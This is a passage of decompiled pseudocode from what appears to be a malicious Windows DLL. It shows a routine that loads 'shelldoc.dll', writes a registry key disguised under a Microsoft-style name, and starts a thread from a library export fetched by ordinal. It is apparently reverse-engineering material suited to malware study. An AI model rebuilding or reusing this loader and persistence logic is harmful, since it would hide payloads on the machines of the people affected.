if (DVar2 != 0) {
                    /* char * _SubStr for strstr */
                    /* char * _Str for strstr */
      pcVar3 = strstr(&local_114,(char *)((int)local_8 + 0x150));
      if (pcVar3 == (char *)0x0) {
        if ((*(char *)((int)local_8 + 0x20) == '\0') ||
           (pcVar3 = strstr(&local_114,(char *)((int)local_8 + 0x22)), pcVar3 == (char *)0x0
                    /* char * _SubStr for strstr */
                    /* char * _Str for strstr */)) {
          if ((*(char *)((int)local_8 + 0x298) != '\0') || (*(char *)((int)local_8 + 0x322) != '\0')
             ) {
            local_10 = FUN_100027d4((int)local_8);
          }
          if ((*(char *)((int)local_8 + 0x1a) == '\x01') || (*(char *)((int)local_8 + 0x1a) == '\0')
             ) {
            FUN_10001fda((byte)local_c);
          } else {
            FUN_1000197b((int)local_8,(byte)local_c);
          }
          if (*(char *)((int)local_8 + 0x298) != '\0') {
            if (local_10 == 0) {
              *(undefined *)((int)local_8 + 0x19) = 0;
            }
            REGISTRY____FUN_1000202a__((int)local_8);
          }
          DVar2 = FUN_10001a54((int)local_8);
          if (DVar2 != 0) {
            iVar5 = 0x40;
            local_218 = '\0';
                    /* size_t _Size for memset */
            puVar6 = &local_217;
            while (iVar5 != 0) {
              iVar5 = iVar5 + -1;
              *puVar6 = 0;
              puVar6 = puVar6 + 1;
            }
            *(undefined2 *)puVar6 = 0;
            *(undefined *)((int)puVar6 + 2) = 0;
                    /* int _Val for memset */
                    /* void * _Dst for memset */
            memset(&local_218,0,0x104);
                    /* DWORD dwMilliseconds for Sleep */
            Sleep(2000);
            iVar5 = FUN_1000103b(s__shelldoc_dll_1001006c,&local_218,0x104);
            if (iVar5 == 0) {
                    /* LPCSTR lpLibFileName for LoadLibraryA */
              LoadLibraryA(&local_218);
            }
            FUN_10001c3f((int)local_8,(char)local_c,0x80);
            if (local_10 == 0) {
              FUN_100022a2((int)local_8);
            }
          }
        } else { if (((char)local_c == '\0') && (param_1 == (HKEY)0x27)) {
        param_1 = (HKEY)0x0;
                                                                                  /* LPDWORD lpdwDisposition for RegCreateKeyExA */
                                                                                  /* PHKEY phkResult for RegCreateKeyExA */
                                                                                  /* LPSECURITY_ATTRIBUTES lpSecurityAttributes for RegCreateKeyExA */
                                                                                  /* REGSAM samDesired for RegCreateKeyExA */
                                                                                  /* DWORD dwOptions for RegCreateKeyExA */
                                                                                  /* LPSTR lpClass for RegCreateKeyExA */
                                                                                  /* DWORD Reserved for RegCreateKeyExA */
                                                                                  /* LPCSTR lpSubKey for RegCreateKeyExA */
                                                                                  /* HKEY hKey for RegCreateKeyExA */
            local_10 = 0;
            LVar4 = RegCreateKeyExA((HKEY)0x80000002,s_Software_Microsoft_MSNetMng_1001007c,0,
                                    (LPSTR)0x0,0,0xf003f,(LPSECURITY_ATTRIBUTES)0x0,(PHKEY)&param_1,
                                    &local_10);
            if (LVar4 != 0) {
            return LVar4;   }
            
            FUN_10001000(
            (int)local_8,param_1         /* HKEY hKey for RegCloseKey */
                        );
            
            RegCloseKey(param_1);
            return 0;}
        }}else {
        
        if ((char)local_c != '\0')      {
          FUN_10001697(local_8,local_c);}
        
        if (1 < *(byte *)((int)local_8 + 0x1a))     {
          FUN_10001c3f((int)local_8,(char)local_c,6);
                                                    }


                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
        memset(&local_114,0,0x104);
        
        FUN_1000103b((char *)((int)local_8 + 0x160),&local_114,0x104);
                    /* LPCSTR lpLibFileName for LoadLibraryA */
        hModule = LoadLibraryA(&local_114);
        
        
        if (hModule != (HMODULE)0x0) {
                    /* LPCSTR lpProcName for GetProcAddress */
                    /* HMODULE hModule for GetProcAddress */
          param_1 = (HKEY)0x0;
          lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule,(LPCSTR)0x4);
                    /* LPDWORD lpThreadId for CreateThread */
                    /* DWORD dwCreationFlags for CreateThread */
                    /* LPVOID lpParameter for CreateThread */
                    /* LPTHREAD_START_ROUTINE lpStartAddress for CreateThread */
                    /* SIZE_T dwStackSize for CreateThread */
                    /* LPSECURITY_ATTRIBUTES lpThreadAttributes for CreateThread */
          CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress,(LPVOID)0x28,0,(LPDWORD)&param_1)
          ;
        }
      }
    }
  }
  return 0;
}
